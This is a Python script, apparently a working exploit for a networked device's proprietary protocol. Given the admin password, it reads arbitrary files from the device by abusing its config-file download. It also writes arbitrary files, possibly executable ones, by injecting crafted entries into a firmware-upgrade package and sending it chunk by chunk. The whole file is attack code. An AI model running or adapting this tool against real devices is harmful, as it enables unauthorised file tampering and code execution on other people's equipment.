import sys
import crypt
import struct
import tarfile
import io

from lib import decode, Channel
from lib.box import get_box_entries, assemble_box

HELP_TEXT = '''To read file:
  python3 [progname] [url] [adminpass] [file_name]

To write file:
  cat [source_file] | python3 [progname] [url] [adminpass] [file_name] [upgrade_type=2]
upgrade_type 3 might allow you to write files with the executable permission

'''

if len(sys.argv) < 4:
  print(HELP_TEXT.replace('[progname]', sys.argv[0]))
  exit(1)


host = sys.argv[1]

uname = b'Admin'
pw = sys.argv[2].encode()
target_file_name = sys.argv[3]
write_file = not sys.stdin.isatty()

upgrade_type = 2 if len(sys.argv) < 5 else int(sys.argv[4])

conn = Channel(host)
conn.connect()

crypt_key = conn.login(uname, pw)
if not crypt_key:
  print('Login failed.', file=sys.stderr)
  exit(1)

print('Downloading config file...', file=sys.stderr)

to_read = target_file_name if not write_file else 'config_server.ini'
conn.send_msg(['O FATA HOINARA', 'CMD', 'DH', 'CFGFILE', 'DOWNLOAD', '1', to_read])

box_data = b''
done = False

while not done:
  msgs, data = conn.recv()

  if data:
    box_data += data[1]

  if msgs:
    for msg in msgs:
      if msg[4:8] == ['DH', 'CFGFILE', 'DOWNLOAD', 'FINISHED']:
        done = True
        break

print('Got config file',  file=sys.stderr)
print('Exported type field', box_data[12:16].hex(), file=sys.stderr)


if not write_file:
  for name, data in get_box_entries(io.BytesIO(box_data)):
    if name == 'ProductModule':
      continue

    if name.endswith('.tar.gz'):
      tf = tarfile.open(fileobj=io.BytesIO(data))
      data = None

      for file in tf:
        file = tf.extractfile(file)
        if file:
          data = file.read()

          break

    if data:
      sys.stdout.buffer.write(data)
      break

else:
  data = sys.stdin.buffer.read()
  data_name = sys.argv[3]

  new_box_entries = [
    (target_file_name, data),

    # this one is so that the operation fails
    # and therefore further upgrade steps are not performed (... are there any?)
    ('/tmp', b'dummy')
  ]

  new_box = assemble_box(box_data, new_box_entries)

  conn.send_msg(['IP', 'CMD', 'WEBUPGRADE', 'BEGIN'])
  while True:
    msg = conn.recv_msg()
    if len(msg) > 5 and msg[4] == 'WEBUPGRADE':
      if msg[5] != 'OK':
        print('web upgrade not possible', msg)
        sys.exit(1)

      break

  # do we need to split by 0x3ec ?
  num_chunks = (len(new_box) + 0x2ff) // 0x300
  print(num_chunks)

  conn.send_msg(['IP', 'CMD', 'WEBUPGRADE', 'LENGTH', str(num_chunks)])
  while True:
    msg = conn.recv_msg()
    if len(msg) > 5 and msg[4] == 'WEBUPGRADE':
      if msg[5] != 'FIRST':
        print('web upgrade error 1')
        sys.exit(1)

      break

  # new_box is the thing to send

  offset = 0
  idx = 0

  # this incredibly stupid...
  # first you need to split the box in chunks - that's ok
  # then you send chunks and after the last one, you send the "checksum" - ok, still makes sense
  # but now.. you send 100 chunks and you must send the checksum twice
  # otherwise? it won't work

  last_next = 0

  while True:
    slice = new_box[offset:offset+0x300]

    to_send = b'PRO\xff' + struct.pack('<HH', idx, len(slice)+10) + slice
    conn.send_data(0, to_send + struct.pack('<H', sum(to_send)))

    offset += len(slice)

    if idx == num_chunks + 1:
      conn.send_data(0, b'PRO\xff' + struct.pack('<H2x', sum(new_box)))

    if idx < last_next:
      break

    while True:
      msg = conn.recv_msg()
      if len(msg) > 4 and msg[4] == 'WEBUPGRADE':
        if msg[5] == 'NEXT':
          print(msg)
          last_next = idx
          idx = int(msg[6])

        break

  while True:
    msg = conn.recv_msg()
    if len(msg) > 5 and msg[4] == 'WEBUPGRADE':
      print(msg)
      break

  print('Possible success', file=sys.stderr)


